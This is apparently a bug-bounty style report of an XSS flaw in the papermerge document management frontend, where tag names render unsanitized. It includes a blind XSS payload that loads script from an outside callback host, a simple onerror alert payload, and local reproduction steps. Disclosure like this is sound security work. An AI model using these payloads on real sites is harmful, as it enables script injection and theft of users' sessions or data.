# Description
Frontend part for papermerge backend.
# Technical Description
XSS in papermerge DMS via rendering of unsanitized tag name in the input label.
# Proof of Concept

* XSS payloads Used for exploit :
  * blind xss payload : ```"><script src=https://copp.xss.ht></script> ``` **use your own blind payloads**
  * Reflected XSS payload : ```<img src=x onerror=alert(1337)>```

1. setup papermerge in your localhost 
2. move to http://127.0.0.1:8000/admin/tag/add/
3. put the payload in the Name field 
4. BOOM !! XSS triggered
